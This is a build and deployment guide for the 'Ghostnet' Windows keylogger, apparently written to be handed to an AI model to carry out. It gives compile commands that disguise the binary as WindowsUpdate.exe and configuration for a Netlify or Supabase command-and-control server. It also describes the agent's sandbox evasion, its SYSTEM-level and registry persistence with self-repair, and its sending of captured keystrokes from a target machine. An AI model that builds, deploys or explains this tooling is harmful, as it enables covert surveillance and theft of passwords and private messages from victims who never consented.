# Ghostnet Agent — Build & Deployment Handoff

This document contains everything needed to compile and deploy the Ghostnet Windows keylogger agent. Hand it to your AI at home.

## Prerequisites

Windows 10/11 machine with internet access.

## Step 1: Install MinGW-w64

Open PowerShell as Administrator and run:

```powershell
# Option A: Install MSYS2 (recommended — gives you current GCC)
winget install -e --id MSYS2.MSYS2

# After install, open MSYS2 UCRT64 terminal (from Start menu) and run:
pacman -S mingw-w64-ucrt-x86_64-gcc

# Add to PATH (in MSYS2 terminal):
# The compiler will be at: C:\msys64\ucrt64\bin\gcc.exe
```

```powershell
# Option B: Standalone MinGW-w64 (simpler, no package manager)
winget install -e --id GnuWin32.Make
# Then download from: https://winlibs.com/
# Extract to C:\mingw64 and add C:\mingw64\bin to PATH
```

Verify install:
```powershell
gcc --version
```

## Step 2: Compile the Agent

Navigate to the `agent/` directory containing `agent.c` and `agent_config.json`:

```powershell
cd <path-to-ghostnet>\agent

gcc agent.c -o WindowsUpdate.exe -mwindows -lwinhttp -lpsapi -liphlpapi -ladvapi32 -lshell32 -lws2_32 -O2 -s
```

**Flag explanation:**
| Flag | Purpose |
|------|---------|
| `-mwindows` | No console window (GUI subsystem) |
| `-lwinhttp` | Link WinHTTP for HTTPS exfil |
| `-lpsapi` | Link PSAPI for process name lookup |
| `-liphlpapi` | Link IP Helper for network info |
| `-ladvapi32` | Link AdvAPI32 for registry persistence |
| `-lshell32` | Link Shell32 for AppData path |
| `-lws2_32` | Link Winsock for hostname/IP lookup |
| `-O2` | Optimize for size + speed |
| `-s` | Strip debug symbols (smaller binary) |

Expected output: `WindowsUpdate.exe` (~50-90 KB)

## Step 3: Verify the Build

```powershell
# Check it's a valid Windows executable
file WindowsUpdate.exe

# Should show: PE32+ executable (GUI) x86-64, for MS Windows

# Check no console subsystem
dumpbin /headers WindowsUpdate.exe | findstr subsystem
# Should show: subsystem (Windows GUI)
```

## Step 4: Configure for Your C2

Edit `agent_config.json` before deploying:

```json
{
  "c2_url": "https://your-netlify-site.netlify.app",
  "c2_port": 443,
  "agent_id": "auto",
  "check_interval_seconds": 30,
  "heartbeat_interval_seconds": 60,
  "config_poll_interval_seconds": 300,
  "blacklist_windows": [
    "Lock Screen",
    "Logon UI",
    "Windows Security",
    "Task Manager"
  ],
  "encrypt_payload": false
}
```

- **c2_url**: Your Netlify site URL (or Supabase project URL)
- **c2_port**: 443 for HTTPS, 80 for HTTP
- **agent_id**: Keep as "auto" — the agent will register and fill this in
- **check_interval_seconds**: How often keystrokes are sent (5-300)
- **blacklist_windows**: Window titles to skip (case-insensitive substring match)

## Step 5: Deploy

Copy both files to the target machine:
- `WindowsUpdate.exe`
- `agent_config.json`

Place them in the same directory and run `WindowsUpdate.exe`.

The agent will:
1. Wait 30-60 seconds before starting (evades sandboxes)
2. Acquire a named mutex (prevents duplicate instances)
3. Install multi-vector persistence:
   - Scheduled Task (SYSTEM startup, runs before login)
   - Registry Run key (user logon)
   - AppData file copy
4. Register with your C2 server
5. Start capturing keystrokes
6. Send batches every N seconds
7. Auto-repair persistence every 15 minutes
8. Flush buffer on system shutdown

## Step 6: Verify on Target

Check the agent is running:
```powershell
tasklist | findstr WindowsAssistant
```

Check debug log:
```powershell
type "$env:APPDATA\Microsoft\Crypto\debug.log"
```

Expected log entries:
- `agent starting`
- `persistence: all vectors installed`
- `c2: registered successfully`
- `hook: installed successfully`
- `agent: entering message loop`

## Troubleshooting

| Problem | Check |
|---------|-------|
| Compile errors | Make sure all `-l` flags are present. Try without `-s` to keep debug info |
| No keystrokes reaching C2 | Check `debug.log` for "c2: registration failed" or "c2: exfil failed" |
| Agent exits immediately | It's detecting a debugger or sandbox. See debug.log. If testing in a VM, the sandbox check may trigger. |
| Hook fails | Run as a regular user (not SYSTEM). WH_KEYBOARD_LL needs a user session. |

## Building from CI/clean OS

If building on a fresh Windows install:

```powershell
# Install MSYS2 + GCC in one go via winget
winget install -e --id MSYS2.MSYS2
# Then open MSYS2 UCRT64 and:
pacman -Syu
pacman -S mingw-w64-ucrt-x86_64-gcc
```

The compiler will be at `C:\msys64\ucrt64\bin\gcc.exe`. Add that to your PATH.
